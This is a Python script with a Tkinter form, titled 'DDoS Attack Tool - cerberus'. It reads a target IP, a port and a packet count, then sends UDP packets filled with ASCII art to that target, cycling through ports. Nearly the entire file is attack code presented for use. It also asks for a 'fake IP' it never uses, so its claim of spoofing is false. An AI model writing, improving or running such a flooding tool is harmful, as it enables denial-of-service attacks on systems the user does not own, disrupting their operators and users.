import socket
import time
import tkinter as tk

cerberus_ascii_art = """
                            /\\_/\\____,
                  ,___/\\_/\\ \\  ~     /
                  \\     ~  \\ )   XXX
                    XXX     /    /\\_/\\___,
                       \\o-o/-o-o/   ~    /
                        ) /     \\    XXX
                      _|    / \\ \\_/
                     /   _  \\_/   \\
                   / (   /____,__|  )
                  (  |_ (    )  \\) _|
                 _/ _)   \\   \\__/   (_
                 (,-(,(,(,/      \\,),),)

"""

BYTES_PER_GB = 1024 * 1024 * 1024
packet_size = len(cerberus_ascii_art.encode())
data_transfer_size = BYTES_PER_GB

root = tk.Tk()
root.title("DDoS Attack Tool - cerberus")

tk.Label(root, text="Enter IP Address of The Target").pack()
target_entry = tk.Entry(root)
target_entry.pack()

tk.Label(root, text="Enter The Fake IP Address").pack()
fake_ip_entry = tk.Entry(root)
fake_ip_entry.pack()

tk.Label(root, text="Enter The Port Number").pack()
port_entry = tk.Entry(root)
port_entry.pack()

tk.Label(root, text="Enter Number of Packets to Send").pack()
num_packets_entry = tk.Entry(root)
num_packets_entry.pack()

def attack(target, port, num_packets, time_interval_seconds):
    global attack_num
    attack_num = 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(num_packets):
            data_packet = cerberus_ascii_art.encode()
            sock.sendto(data_packet, (target, port))
            time.sleep(time_interval_seconds)
            attack_num += 1
            port = (port + 1) % 65535
            print(f"Sent {attack_num} packet to {target} through port: {port}")
    except  Exception as  e:
        print("An error occurred during the attack:", e)

def start_attack():
    target = target_entry.get()
    fake_ip = fake_ip_entry.get()
    port = int(port_entry.get())
    num_packets = int(num_packets_entry.get())

    time_interval_seconds = 1 / num_packets

    attack(target, port, num_packets, time_interval_seconds)

tk.Button(root, text="Start Attack", command=start_attack).pack()

root.mainloop()
